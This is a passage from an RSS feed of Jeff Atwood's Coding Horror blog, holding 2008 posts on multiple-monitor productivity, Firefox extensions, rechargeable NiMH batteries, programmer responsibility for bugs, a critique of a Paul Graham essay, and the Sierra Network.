<p>I dug around a bit and found <a href="http://www.necdisplay.com/gowide/NEC_Productivity_Study_0208.pdf">the actual study results</a> (pdf) or something very close to it, if you're looking for more detail than the summary I've presented above. This isn't the first time the University of Utah has conducted a multiple monitor study. It's very similar to the <a href="http://www.necus.com/necus/media/press_releases/template.cfm?DID=1947">multiple monitor survey they conducted in 2003</a>, also under the auspices of NEC. I agree it's a little sketchy to cite a study from a display vendor that advocates-- surprise-- buying more and bigger displays. But bear in mind they did find diminishing productivity returns with 26 inch displays. This is something I personally experienced, and I dubbed it the <a href="http://www.codinghorror.com/blog/archives/000928.html">The Large Display Paradox</a>. That finding isn't exactly going to endear them to display vendors.</p>
<p>Patrick Dubroy took <a href="http://dubroy.com/blog/2008/01/25/multiple-monitor-productivity-fact-or-fiction/">a skeptical look at the multiple monitor productivity claims</a> and found several credible sources of data. I'll combine his finds with mine to provide <strong>a one-stop-shop for research data supporting the idea that, yes, having more display space <em>would</em> in fact make you more productive:</strong></p>
<ul>
<li>
<a href="http://www.nytimes.com/2006/04/20/technology/20basics.html?ex=1303185600&amp;en=6fc17b9bf54c62ef&amp;ei=5088&amp;partner=rssnyt&amp;emc=rss">The Virtues of a Second Screen</a> </li>
<li>
<a href="http://www.necdisplay.com/gowide/NEC_Productivity_Study_0208.pdf">A Comparison of Single and Dual Traditional Aspect Displays with a Widescreen Display over Productivity</a> (pdf) </li>
<li>
<a href="http://research.microsoft.com/apps/pubs/default.aspx?id=64317">Toward Characterizing the Productivity Benefits of Very Large Displays</a> (pdf) </li>
<li>
<a href="http://images.apple.com/pro/pdf/Cin_Disp30_report.pdf">The 30-inch Apple Cinema HD Display Productivity Benchmark</a> (pdf) </li>
</ul>
<p>Patrick, despite his skepticism – and remember, this is a guy who didn't see a productivity difference between a 14 inch laptop display and a "big ass LCD" – came away convinced:</p>
<blockquote>After looking at the studies, I think it's fair to say that some tasks can be made significantly faster if you have more screen real estate. On the other hand, I think it's clear that most programmers are not going to be 50% more productive over the course of a day just by getting a second monitor. The tasks that can be improved are not the bottleneck to programmer productivity.</blockquote>
<p>I'm not sure what Patrick was expecting here. Let me be perfectly clear on this matter: <strong>more is <em>more</em></strong>. More usable desktop space reduces the amount of time you spend on window management excise. Instead of incessantly dragging, sizing, minimizing and maximizing windows, you can do actual productive work. With a larger desktop, you can spend less time mindlessly arranging information, and more time interacting with and acting on that information. How much that matters to you will depend on your job and working style. Personally, I'd be ecstatic if I never had to size, position, or arrange another damn window for the rest of my life.</p>
<p>Choose own your path to happiness, whether it's upgrading to a single 30" display, dual 24" widescreen displays, or three standard 20" displays. As long as it results in more usable desktop space, it's a clear win. <strong>I support all of the above scenarios, and more importantly, the existing research does too.</strong> The price of a few monitors is negligible when measured against the labor cost of a programmer or information worker salary. Even if you achieve a meager two or three percent performance increase, it will have <em>more</em> than paid for itself.</p>
<p>What does get a little frustrating is when people claim that one large monitor should be "enough for anyone". This isn't a zero-sum game. Where there is one large monitor, there <em>could</em> be two large monitors, or three.</p>
<p>Sometimes, <strong>more is more</strong>.</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-16T13:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/does-more-than-one-monitor-improve-productivity/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ The Dark Side of Extensions ]]></title>
<link>https://blog.codinghorror.com/the-dark-side-of-extensions/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>One of the best things –  if not <i>the</i> best thing –  about <a href="http://en.wikipedia.org/wiki/Mozilla_Firefox">Firefox</a> is the rich, vibrant ecosystem of <a href="https://addons.mozilla.org/en-US/firefox/">add-ons</a> that has grown up around it. Almost anything you could possibly want to do with a web browser can be done with Firefox... <i>if</i> you're willing to hunt down the necessary extension. In <a href="http://www.codinghorror.com/blog/archives/000706.html">Buy the Community, not the Product</a>, I argued that this made Firefox the better browser. That's still true today.</p>
<p>But relying on extensions and add-ins isn't the whole story. Not by a long shot. Consider the average user who has no clue how fabulous those Firefox extensions may be, much less where to find them or how to install them. I'm not saying it's complicated, but <b>any installation at all is too much work</b> for a sizable percentage of the audience. They'll use the browser as it was supplied to them, forever. That's <a href="http://www.codinghorror.com/blog/archives/000290.html">the power of defaults</a>.</p>
<p>In <a href="http://destraynor.com/serendipity/index.php?/archives/151-9-things-Firefox-should-steal-from-Safari.html">9 things Firefox should steal from Safari</a>, Des highlighted some of the unique and innovative features in the Safari web browser:</p>
<ul>
<li>Improved current field highlighting</li>
<li>Alternate <a href="http://blog.codinghorror.com/whats-wrong-with-apples-font-rendering/">font rendering</a>
</li>
<li>Cleaner downloads dialog</li>
<li>Faster HTML rendering</li>
<li>Simple, painless bug reporting</li>
<li>Visual incremental find</li>
<li>Detachable tabs</li>
<li>Draggable images</li>
<li>Resizable text areas</li>
</ul>

<p>All of these features are well worth copying and including in the core Firefox browser. Despite Des' thoughtful analysis, the avalanche of comments across Digg, Reddit, and Des' own site had one universal, monotonous response:</p>
<blockquote>
It seems the author simply hasn't really tried to use Firefox. 5 points can be changed by extensions, two are non existent, one is a Windows issue, and one is disputable.
</blockquote>
<p><b>Extensions, extensions, extensions.</b> Indeed, why bother improving the core browser when you can force the user to install five extensions to duplicate that same functionality? This approach doesn't make any sense to me, and <a href="http://www.destraynor.com/serendipity/index.php?/archives/2007/08.html">I think Des agrees</a>:</p>
<blockquote>
<p>Every day I see little things in Safari that could and should be copied. In Safari if I type destraynor.cmo into my url bar, it realises that there is no .cmo, and looks at previous sites I've visited, and sends me to destraynor.com. Firefox doesn't do that. Not without installing extensions. The majority of internet users, surprisingly, do not feel the need to install custom browser components. When they see Safari do something clever like this they don't think "Hey, that's cool, I better check mozilla.org to see if anyone has written an extension to spell check urls", they just think "Hey that's cool", or maybe "Hey that's cool, I wish firefox could do that." That's why you have to <a href="http://www.scripting.com/2002/01/12.html">fight for every inch</a>.</p>
</blockquote>
<p>Since Des' initial post, <a href="http://www.apple.com/safari/download/">Safari 3.1</a> was released with even more features. Firefox 3 isn't quite out yet, but <a href="http://www.mozilla.com/en-US/firefox/all-beta.html">Firefox 3.0 beta 4</a> offers a fairly complete picture of what the final version of Firefox 3 will look like later this year. The only feature that is no longer an issue on Des' original list is HTML rendering speed. All the others remain.</p>
<p>Extensions, as a solution to general software and productivity problems, have both dark and light sides.</p>
<img alt="image placeholder" >
<p>Extensions offer wonderful enhancements to Firefox. It's a huge credit to the Firefox development team that <b>they made extensions both easy to create and incredibly powerful</b>. This is something that the Safari and IE teams appear incapable of doing. We can't even have this discussion about those browsers because their add-on ecosystems are pale shadows of the massive Firefox extension community. The Firefox team absolutely deserves all the market share they've earned from that one crucial decision.</p>
<p>But extensions are also an indictment of Firefox. If an extension is wildly popular and everyone urges you to install some "crucial" or "essential" extension in Firefox  –  <b>shouldn't that extension have been baked into the browser in the first place?</b> If I ran the Firefox development team, every new development cycle, I'd take the list of <a href="https://addons.mozilla.org/en-US/firefox/browse/type:1/cat:all/sort:popular">top 5 Firefox add-ins</a> and <i>demand that we fold that functionality into the core product</i>.</p>
<p>Half the value of a robust add-in ecosystem lies in product guidance –  users are taking it upon themselves to fill the gaps and holes in your product, and audience metrics tell you exactly which holes truly <i>needed</i> filling. Sure, there are some oddball extensions that only a few users might care about –  but when extensions reach critical download mass and the same extensions appear repeatedly on <a href="http://www.google.com/search?q=best+firefox+extensions">best Firefox extension lists</a>, they're filling a universal need. Ignoring that is just irresponsible software development, pure and simple.</p>
<p>If software developers were doing their jobs properly, an extension ecosystem wouldn't be necessary –  99% of the features users want and need would be already baked into the shipping software. And yet without a robust, powerful extension ecosystem, I suspect developers have a terrible idea of what features users actually <i>do</i> use and want. They're guessing.</p>
<p>It's sort of a <a href="http://en.wikipedia.org/wiki/Catch-22">Catch-22</a>.</p>
<p>So when I see a user post an enormous list of Firefox extensions they've installed, as in the comments of <a href="http://lifehacker.com/355973/make-your-extensions-work-with-the-firefox-3-beta">this lifehacker post</a>:</p>
<table cellpadding="4" cellspacing="4" width="600">
<tr>
<td valign="top">
AdBlockPlus 0.7.5.3<br>
All-In-One Sidebar 0.6.1<br>
Always Remember Password 0.6<br>
BlockSite 0.6<br>
ColorfulTabs 3.0<br>
CustomizeGoogle 0.69<br>
CuteMenus - Crystal SVG 1.9.2<br>
Forcecastfox I10n<br>
Furl Tools 0.8<br>
GMail Notifier 0.6.3.2<br>
Greasemonkey 0.6.8.20070314.0<br>
Image Zoom 0.2.6<br>
Japanese English Dictionary for rikaichan 1.05<br>
No Squint 1.0.1
</td>
<td valign="top">
PDF Download 1.0.10<br>
PeraPera-kun 0.5.22<br>
Places' Full Titles 3rc3<br>
PrefButtons 0.3.3<br>
QuickJava 0.4.2.1<br>
Redirect Remover 2.5.3<br>
Remove It permanently 1.0.6.3<br>
Secure Login 0.9.0.6<br>
Session Manager 0.6.1.9<br>
SmoothWheel 0.44.10.20071026<br>
StopAutoplay 0.7.2<br>
Stylish 0.5.1<br>
Temporary Inbox 2.1<br>
User Agent Switcher 0.6.10<br>
XHTML Ruby Support 1.4.20061000801<br>
Xinha Here! 0.12
</td>
</tr>
</table>
<p>Or when I hear, as I often do, how someone <b>couldn't possibly imagine using Firefox without the three or four extensions that they absolutely <i>must</i> have</b>... I'm torn. How many of those nifty extensions are specialized functionality –  and how many are crude spackle over missing features that really should have shipped in the box?</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-18T13:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/the-dark-side-of-extensions/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Adventures in Rechargeable Batteries ]]></title>
<link>https://blog.codinghorror.com/adventures-in-rechargeable-batteries/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>Every self-respecting geek loves gadgets. I'm no exception. And so many of my favorite gadgets have a voracious appetite for batteries. I don't know why all the other battery types fell so far out of favor, but between AA and AAA, I could probably power 95% of my household gadget needs.</p>
<p><img alt="image placeholder" >
<p>I've been a rechargeable battery user for years. It seems the frugal thing to do in the long run, and it's also healthier for the planet when we aren't discarding mountains of single-use batteries into landfills. I remember switching over to the then-new NiMH battery type based on a late 90's John Dvorak column touting their availability and power. Miraculously, <a href="http://www.hayestech.com/nimh.htm">that very article is still available on the internet</a>:</p>
<blockquote>The calculation of cost for nickel hydride batteries in the table is for 100 recharges. Hawk says the industry knows that nickel hydride batteries can easily last through 500 recharges. I've seen data indicating that 1,000 charges are possible. This drops the cost per 10,000 pictures to 70 cents! I'm convinced that the industry doesn't want people to know about these batteries. I seriously doubt you'll be seeing them on a rack in the grocery store anytime soon. Do the math: It's like buying 1,000 alkaline batteries for less than 10 bucks. Imagine what this does to the lucrative disposable-battery business.
<p>So now I wonder where the D, C, and AAA nickel hydride batteries are? Mostly in Japan. As far back as January 1996, Toshiba rolled out the first complete line of standard cells and other Japanese battery makers have followed. This event was essentially hushed up in the U.S. market. The big-name American battery companies have avoided this market-killing technology for obvious reasons.</p>
</blockquote>
<p>I immediately rushed out bought a bunch of the batteries and the charger from the importer that Mr. Dvorak recommended. In fact I still have some of those original models. Let's compare these ten year old 1998 NiMH batteries to their 2008 cousins:</p>
<p><img alt="image placeholder" >
<p>The picture can be a little hard to read, so I've reprinted the technical details from each AA battery below:</p>
<table cellspacing="4" cellpadding="4">
<tbody>
<tr>
<td>1998</td>
<td>NiMH GP Rechargeable</td>
<td>1.2v, 1300 mAh</td>
</tr>
<tr>
<td>2008</td>
<td>NiMH Energizer Rechargeable</td>
<td>1.2v, <span style="color: red;">2500 mAh</span>
</td>
</tr>
</tbody>
</table>
<p>Is it really true that <strong>AA battery capacity has <em>almost doubled</em> in the last ten years?</strong> That's pretty amazing. But as I found out, it's not the entire story.</p>
<p>For one thing, there's the issue of <strong>discharge rate</strong>. It turns out that massive 2500mAh capacity of the Energizer rechargeable battery doesn't mean much when the battery drains itself within a month. Take it from <a href="http://www.amazon.com/review/R2UW60Y48A0V70/ref=cm_cr_rdp_perm">Mr. Lee</a>:</p>
<blockquote>All rechargeable battery manufacturers love to boast about their product's current capacity (mAh). But there is a dirty little secret that they don't want you to hear: self-discharge rate. Simply put: a fully charged NiCd of NiMH cell will gradually lose its stored energy over time. Technical papers I have researched typically put the self-discharge rate at 10-20% per month for NiCd cells, and 20-30% per month for NiMH cells. This kind of self-discharge rate is usually acceptable in applications such as digital cameras.
<p>I bought 8 of those Energizer 2500mAh rechargeable NiMH batteries over one year ago. At first, I was very happy about the large current capacity offered by those batteries. But within a few months, I started to notice that they die very quickly in my digital camera. In fact, a set of Sony 2000mAh NiMH batteries I bought one year earlier seems to last much longer when used in the same camera.</p>
</blockquote>
<p>So putting a larger number on the box is ultimately a method of fooling consumers with marketing. Where have we seen that before? Oh right, <em>everywhere</em>. Caveat emptor. Mr. Lee recommends the following model batteries, which exhibit much saner self-discharge rates; I've since bought a few batches of both the Eneloop and the Hybrid cells:</p>
<ul>
<li>
<a href="http://www.amazon.com/exec/obidos/ASIN/B004UG41W8/codihorr-20">Sanyo Eneloop NiMH AA</a> </li>
<li>
<a href="http://www.amazon.com/exec/obidos/ASIN/B000LPTDQQ/codihorr-20">Rayovac Hybrid NiMH AA</a> </li>
<li>
<a href="http://www.amazon.com/exec/obidos/ASIN/B000XSA60I/codihorr-20">Duracell Pre-Charged NiMH AA</a> </li>
</ul>
<p>In general you want the "hybrid" or "pre-charged" varieties, and should ignore ridiculous claims about capacity.</p>
<p>The other pitfall of rechargeable batteries lies in the recharging process itself. Even if you buy the very best rechargeable batteries, <strong>if you charge them improperly</strong>, you'll get <a href="http://www.amazon.com/review/R1911A7DQEVRKF/ref=cm_cr_rdp_perm">poor results</a>.</p>
<blockquote>Charging NiMH batteries is the result of a compromise. A low current is gentle on the battery and maximizes its lifespan, but a full charge takes hours.  A high current will recharge the battery much faster, but put more strain on it, causing it to wear out prematurely. It also requires careful monitoring of the battery's electrical characteristics to prevent damage.
<p>Most of the chargers on the market today use one or the other of these methods. The fast chargers, especially the cheap ones, excel at one thing: destroying perfectly good batteries, because they lack the monitoring circuitry to control the charge current and detect when the battery is full. The slow chargers are usually better, mainly because it's harder to design a really bad slow charger. Unfortunately... they're slow.</p>
</blockquote>
<p>Most bundled battery chargers are junk. Given the inherent compromises of charging, you need something smart. That's why I ended up tossing my generic "rapid" chargers in favor of the majestic, glorious, and surprisingly inexpensive <a href="http://www.amazon.com/exec/obidos/ASIN/B004J6DLD4/codihorr-20">La Crosse Technology BC-900 AlphaPower battery charger</a>.</p>
<p><a href="http://www.amazon.com/exec/obidos/ASIN/B004J6DLD4/codihorr-20"><img alt="image placeholder" >
<p>Seriously, just look at this thing. It's a geek's dream. Each battery can be controlled individually, with its own real-time LCD readout, in four modes:</p>
<ol>
<li>
<strong>Charge</strong> at various rates, from 200/500/700/1000mA </li>
<li>
<strong>Discharge</strong> at 1/2 the charging rate </li>
<li>
<strong>Test</strong> to determine <em>true</em> battery capacity </li>
<li>
<strong>Refresh</strong> to "revitalize" older batteries </li>
</ol>
<p>You can also switch between four different readouts after the mode is engaged: time elapsed, voltage, mAh charge/discharge rate, and current mAh capacity. That <strong>refresh</strong> mode is incredibly slow-- it's basically discharging and recharging over and over-- but it really works. It can take marginal batteries from the brink of death and give them new life.</p>
<p>But you don't have to care about any of that; <strong>if you just drop 4 AAs or AAA batteries in the device, it will charge them fine</strong>. I spent several hours after I got it plugging various batteries in it, trying different modes, and watching it work. I'm not sure what the exact definition of geek is, but I think "enjoys recharging batteries" has to be very high on that list.</p>
<p>I can't recommend the BC-900 highly enough. Did I mention it comes packaged with a starter set of 4 rechargeable AA and AAA batteries, D-cell adapter shells, and a nifty nylon carrying case, too? But don't take my word for it. <a href="http://www.amazon.com/exec/obidos/ASIN/B004J6DLD4/codihorr-20">Read the Amazon reviews</a>; they're positively <em>glowing</em>.</p>
<p>The gadget world may run on AA and AAA cells, but armed with a basic knowledge of NiMH battery technology and a great recharger, you too can be more than prepared to meet that challenge.</p>
<p>Gentlemen, start your chargers.</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-19T13:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/adventures-in-rechargeable-batteries/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ The First Rule of Programming: It's Always Your Fault ]]></title>
<link>https://blog.codinghorror.com/the-first-rule-of-programming-its-always-your-fault/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
You know the feeling. It's happened to all of us at some point: you've pored over the code a dozen times and <i>still</i> can't find a problem with it. But there's some bug or error you can't seem to get rid of. There just has to be something wrong with the machine you're coding on, with the operating system you're running under, with the tools and libraries you're using. There just <i>has to be!</i>
</p>
<p>
No matter how desperate you get, don't choose that path. Down that path lies voodoo computing and <a href="http://pragmaticprogrammer.com/the-pragmatic-programmer/extracts/coincidence">programming by coincidence</a>. In short, madness.
</p>
<p>
It's frustrating to repeatedly bang your head against difficult, obscure bugs, but don't let desperation lead you astray. An essential part of <a href="http://www.codinghorror.com/blog/archives/000051.html">being a humble programmer</a> is realizing that whenever there's a problem with the code you've written, <b>it's always your fault</b>.  This is aptly summarized in <a href="http://www.amazon.com/exec/obidos/ASIN/020161622X/codihorr-20">The Pragmatic Programmer</a>  as "Select Isn't Broken":
</p>
<p>
</p>
<blockquote>
In most projects, the code you are debugging may be a mixture of application code written by you and others on your project team, third-party products (database, connectivity, graphical libraries, specialized communications or
algorithms, and so on) and the platform environment (operating system, system libraries, and compilers).
<p>
It is possible that a bug exists in the OS, the compiler, or a third-party product-- but this should not be your first thought. It is much more likely that the bug exists in the application code under development. It is generally more profitable to assume that the application code is incorrectly calling into a library than to assume that the library itself is broken. Even if the problem <i>does</i> lie with a third party, you'll still have to eliminate your code before submitting the
bug report.
</p>
<p>
We worked on a project where <b>a senior engineer was convinced that the select system call was broken on Solaris</b>. No amount of persuasion or logic could change his mind (the fact that every other networking application on the box worked fine was irrelevant). He spent weeks writing workarounds, which, for some odd reason, didn't seem to fix the problem. When finally forced to sit down and read the documentation on select, he discovered the problem and corrected it in a matter of minutes. We now use the phrase "select is broken" as a gentle reminder whenever one of us starts blaming the system for a fault that is likely to be our own.
</p>
</blockquote>
<p>
The flip side of <a href="http://www.codinghorror.com/blog/archives/000219.html">code ownership</a> is <i>code responsibility</i>. No matter what the problem is with your software-- maybe it's not even your code in the first place-- <b>always assume the problem is in your code</b> and act accordingly. If you're going to subject the world to your software, take full responsibility for its failures. Even if, technically speaking, you don't have to. That's how you earn respect and credibility. You certainly don't earn respect or credibility by endlessly pawning off errors and problems on other people, other companies, other sources.
</p>
<p>
Statistically, you understand, it is incredibly rare for any bugs or errors in your software <i>not</i> to be your fault. In <a href="http://www.amazon.com/exec/obidos/ASIN/0735619670/codihorr-20">Code Complete</a>, Steve McConnell cited two studies that proved it:
</p>
<p>
</p>
<blockquote>
A pair of studies performed [in 1973 and 1984] found that, of total errors reported, <b>roughly 95% are caused by programmers</b>, 2% by systems software (the compiler and the operating system), 2% by some other software, and 1% by the hardware. Systems software and development tools are used by many more people today than they were in the 1970s and 1980s, and so my best guess is that, today, an even higher percentage of errors are the programmers' fault.
</blockquote>
<p>
Whatever the problem with your software is, take ownership. Start with your code, and investigate further and further outward until you have definitive evidence of where the problem lies. If the problem lies in some other bit of code that you don't control, you'll not only have learned essential troubleshooting and diagnostic skills, you'll also have an audit trail of evidence to back up your claims, too. This is certainly a lot more work than shrugging your shoulders and pointing your finger at the OS, the tools, or the framework-- but it also engenders a sense of trust and respect you're unlikely to achieve through fingerpointing and evasion.
</p>
<p>
If you truly aspire to being a humble programmer, you should have no qualms about saying "hey, this is my fault-- and I'll get to the bottom of it."
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-20T13:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/the-first-rule-of-programming-its-always-your-fault/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Paul Graham's Participatory Narcissism ]]></title>
<link>https://blog.codinghorror.com/paul-grahams-participatory-narcissism/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>I have tremendous respect for Paul Graham. His <a href="http://www.paulgraham.com/articles.html">essays</a> – repackaged in the book <a href="http://www.amazon.com/exec/obidos/ASIN/0596006624/codihorr-20">Hackers and Painters</a> – are among the best writing I've found on software engineering. <a href="http://www.codinghorror.com/blog/archives/000261.html">Not all of them are so great</a>, of course, but the majority are well worth your time. That's more than I can say for 99.9-infinitely-repeating-percent of the content on the web. He's certainly a better and more authoritative writer than I.</p>
<p>But lately I've begun to wonder whether Mr. Graham, <a href="http://www.codinghorror.com/blog/archives/000679.html">like Joel Spolsky before him</a>, has devolved into self-absorption and irrelevance. Consider his latest essay, <a href="http://www.paulgraham.com/boss.html">You Weren't Meant to Have a Boss</a>, which opens with this distasteful anecdote:</p>
<blockquote>
<p>A few days ago I was sitting in a cafe in Palo Alto and a group of programmers came in on some kind of scavenger hunt. It was obviously one of those corporate "team-building" exercises.</p>
<p>They looked familiar. I spend nearly all my time working with programmers in their twenties and early thirties. But something seemed wrong about these. There was something missing.</p>
<p>And yet the company they worked for is considered a good one, and from what I overheard of their conversation, they seemed smart enough. In fact, they seemed to be from one of the more prestigious groups within the company. So why did it seem there was something odd about them?</p>
<p>The guys on the scavenger hunt looked like the programmers I was used to, but <b>they were employees instead of founders</b>. And it was startling how different they seemed.</p>
<p>So what, you may say. So I happen to know a subset of programmers who are especially ambitious. Of course less ambitious people will seem different. But the difference between the programmers I saw in the cafe and the ones I was used to wasn't just a difference of degree. Something seemed wrong.</p>
<p>I think it's not so much that there's something special about founders as that there's something missing in the lives of employees. I think startup founders, though statistically outliers, are actually living in a way that's more natural for humans.</p>
<p>I was in Africa last year and saw a lot of animals in the wild that I'd only seen in zoos before. It was remarkable how different they seemed. Particularly lions. Lions in the wild seem about ten times more alive. They're like different animals. And seeing those guys on their scavenger hunt was like seeing lions in a zoo after spending several years watching them in the wild.</p>
</blockquote>
<p>I'm not sure why Mr. Graham felt the need to draw this incredibly condescending parallel with company employees and <i>caged animals in the zoo</i>.</p>
<p>I've actually taken Mr. Graham's advice. <a href="http://www.codinghorror.com/blog/archives/001074.html">I recently quit my job</a> to blog and participate in a micro startup. Even though I'm now one of the anointed founders in Mr. Graham's book, I still found this comparison retroactively offensive to all those years I worked as an employee for various companies and had perfectly enriching, rewarding – dare I say even <i>enjoyable</i> – experiences. Or at least as happy as a caged animal in a zoo can ever be, I suppose.</p>
<img alt="image placeholder" >
<p>Mr. Graham's essay does contain some fair points, if you can suppress your gag reflex long enough to get to them. If you don't have time to read it, lex99 posted <a href="http://reddit.com/r/programming/info/6cu0t/comments/c03hyof">this succinct summary</a> that captured its flavor perfectly:</p>
<blockquote>
<p>I work with young startup founders in their twenties. They're geniuses, and play by their own rules. <b>Oh... <i>you</i> haven't founded a company? You suck.</b></p>
</blockquote>
<p>Small businesses are the backbone of the American economy. And Mr. Graham is absolutely right to encourage young people to take risks early in life, to join small business startups with potentially limitless upside while they have nothing to lose – no children, no mortgage, no significant other. I believe in this so strongly I included it as a slide in <a href="http://www.codinghorror.com/blog/archives/001039.html">my presentation to graduating Canadian computer science students</a>.</p>
<p><a href="http://www.paulgraham.com/hiring.html"><img alt="image placeholder" >
<p>Indeed, you <i>should</i> take insane career risks while you're young.</p>
<p>And there are lots of large corporate soul-sucking programming jobs that are, quite literally, Dilbert cartoons brought to life.</p>
<p>The problem with this particular essay is the way Mr. Graham implies <b>the <i>only</i> path to true happiness as a young programmer lies in founding a startup</b>. If you aren't a founder, or one of the first 10 employees, then, well.. enjoy your life at the zoo. We'll be sure to visit when we aren't busy loping free on the plains, working the way people were meant to. I'm not paraphrasing here; he actually wrote that: working the way people <i>were meant to</i>. The sense of disdain, the dismissiveness, is nearly palpable.</p>
<p>He acknowledges that his perspective is warped because "nearly all the programmers [he knows] are startup founders." Therein lies the problem. These essays are no longer about software engineering; they're about <i>Paul Graham</i>. They've become <a href="http://www.idlewords.com/2005/04/dabblers_and_blowhards.htm">participatory narcissism</a>:</p>
<blockquote>
<p>After a while, you begin to notice that all the essays are an elaborate set of mirrors set up to reflect different facets of the author, in a big distributed act of participatory narcissism.</p>
</blockquote>
<p>Naturally, every young software programmer worth a damn forms a startup. Because that's what Mr. Graham's company, <a href="http://ycombinator.com/">Y Combinator</a>, does. They fund startups with young software programmers. He projects his reality outward, reflecting it against the rest of us so brightly and so strongly that we're temporarily blinded. We stop seeing our own reality and trade it for his, in a form of participatory narcissism – we believe in the one true path to success, exactly the way Mr. Graham has laid it before us. Traditional employment? That's for suckers. <i>Real</i> go-getters start their own companies.</p>
<p>On the whole, I think I preferred Paul Graham's essays when they were <b>more about software engineering and less about Paul Graham</b>.</p>
<p><font color="red">Update:</font> Paul Graham posted two essays that partially respond to this post: <a href="http://www.paulgraham.com/bossnotes.html">You Weren't Meant to Have a Boss: The Cliffs Notes</a> and <a href="http://www.paulgraham.com/disagree.html">How to Disagree</a>. The latter is, as far as I can tell, a sort of <a href="http://www.codinghorror.com/blog/archives/000892.html">EULA</a> for disagreeing with Paul Graham. Based on the conversation this post initiated, I attended a Y Combinator dinner and got to meet Mr. Graham in person. That is, to me, the point of posts like this – some initial disagreement ultimately leading to deeper, more satisfying communication. A net positive all around.</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-21T13:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/paul-grahams-participatory-narcissism/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ The Sierra Network II ]]></title>
<link>https://blog.codinghorror.com/the-sierra-network-ii/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
You may remember <a href="http://en.wikipedia.org/wiki/ImagiNation_Network">Sierra's ImagiNation network</a> from the earliest days of dial-up networking:
</p>
<p>
</p>
<blockquote>
The ImagiNation Network (INN), aka The Sierra Network (TSN), was <b>the first online multiplayer gaming system</b>. Developed by Sierra On-Line in 1989, and first available to the public in 1991, the ImagiNation Network was a unique online gaming network that gave subscribers from all over the United States of America a place where they could "play games, make friends and have fun". With a wide variety of games including RPGs, WWI aeroplane simulations, live trivia, and card and board games, almost every user could find something enjoyable to play. INN also featured an electronic post office, many bulletin boards, chat rooms, and the company boasted of having "more than 200 groups, clubs and special events online."
</blockquote>
<p>
I had an account on <a href="http://en.wikipedia.org/wiki/ImagiNation_Network">The Sierra Network</a> for a while. The graphics were incredible for that era, at least compared to the text-only BBS games that passed for online multiplayer gaming at the time. Still, it wasn't quite my cup of tea, so I didn't last long there. I finally achieved online multiplayer satisfaction a few years later with <a href="http://en.wikipedia.org/wiki/Doom_%28video_game%29">Doom</a>, <a href="http://en.wikipedia.org/wiki/DWANGO">Dwango</a>, and <a href="http://en.wikipedia.org/wiki/Kali_(game_browser)">Kali</a>.
</p>
<p>
<a href="http://en.wikipedia.org/wiki/ImagiNation_Network"><img alt="image placeholder" >
</p>
<p>
The Sierra Network is an interesting bit of computer history trivia at best. But it's <i>particularly</i> relevant when you compare it to the <a href="http://www.techcrunch.com/2008/03/21/at-launch-mytopia-shows-social-networks-how-to-play-nicely-together">recently launched Mytopia gaming service</a>. Mytopia allows you to play common internet games (think hearts, sudoku, chess, etcetera) across several popular <a href="http://www.codinghorror.com/blog/archives/000898.html">walled garden</a> social networking sites including MySpace and Facebook.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
The resemblance, indeed, is astonishing. It has to be some sign of the coming internet apocalypse when <b>a startup has essentially rebuilt The Sierra Network in Web 2.0 fashion</b>.
</p>
<p>
(via rei on <a href="http://www.quartertothree.com">QuarterToThree</a>)
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-23T13:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/the-sierra-network-ii/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Is Eeyore Designing Your Software? ]]></title>
<link>https://blog.codinghorror.com/is-eeyore-designing-your-software/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
This <a href="http://blogs.msdn.com/ericlippert/archive/2003/10/28/53298.aspx">classic Eric Lippert post</a> describes, in excruciating, painful detail, exactly how much work it takes to add a single <i>ChangeLightBulbWindowHandleEx</i> function to a codebase at Microsoft:
</p>
<p>
</p>
<blockquote>
<li>One dev to spend five minutes implementing ChangeLightBulbWindowHandleEx.
</li>
<li>One program manager to write the specification.
</li>
<li>One localization expert to review the specification for localizability issues.
</li>
<li>One usability expert to review the specification for accessibility and usability issues.
</li>
<li>At least one dev, tester and PM to brainstorm security vulnerabilities.
</li>
<li>One PM to add the security model to the specification.
</li>
<li>One tester to write the test plan.
</li>
<li>One test lead to update the test schedule.
</li>
<li>One tester to write the test cases and add them to the nightly automation.
</li>
<li>Three or four testers to participate in an ad hoc bug bash.
</li>
<li>One technical writer to write the documentation.
</li>
<li>One technical reviewer to proofread the documentation.
</li>
<li>One copy editor to proofread the documentation.
</li>
<li>One documentation manager to integrate the new documentation into the existing body of text, update tables of contents, indexes, etc.
</li>
<li>Twenty-five translators to translate the documentation and error messages into all the languages supported by Windows.The managers for the translators live in Ireland (European languages) and Japan (Asian languages), which are both severely time-shifted from Redmond, so dealing with them can be a fairly complex logistical problem.
</li>
<li>A team of senior managers to coordinate all these people, write the cheques, and justify the costs to their Vice President.
</li>
</blockquote>
<p>
